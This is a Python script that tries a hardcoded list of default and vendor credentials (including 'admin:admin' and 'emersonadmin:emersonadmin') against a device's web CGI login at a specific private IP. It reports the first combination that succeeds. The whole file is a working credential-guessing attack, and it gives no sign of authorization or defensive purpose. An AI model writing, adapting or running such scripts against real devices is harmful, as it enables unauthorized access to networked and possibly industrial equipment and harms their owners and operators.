import urllib.request
import urllib.parse
import base64
import time
import json
import sys

sys.stdout.reconfigure(encoding='utf-8')

def test_login(ip, username, password):
    url = f"http://{ip}/app/www_user/html/cgi-bin/web_cgi_main.cgi?_={int(time.time()*1000)}"
    u_b64 = base64.b64encode(username.encode()).decode()
    p_b64 = base64.b64encode(password.encode()).decode()
    post_data = f"user_name={u_b64}&user_password={p_b64}".encode('utf-8')
    
    req = urllib.request.Request(url, data=post_data, headers={
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    })
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode('utf-8-sig', errors='ignore').strip()
            print(f"Testing {username}:{password} -> {body}")
            try:
                res = json.loads(body)
                if res.get('status') == 1:
                    return res
            except Exception as e:
                print("json err:", e)
    except Exception as e:
        print(f"Error testing {username}:{password} -> {e}")
    return None

candidates = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "1234"),
    ("admin", "Admin"),
    ("Admin", "Admin"),
    ("emersonadmin", "emersonadmin"),
    ("operator", "operator"),
    ("user", "user"),
]

for u, p in candidates:
    res = test_login("10.209.30.21", u, p)
    if res and res.get('status') == 1:
        print(f"SUCCESS! Logged in as {u}:{p} with response: {res}")
        break
    time.sleep(0.5)
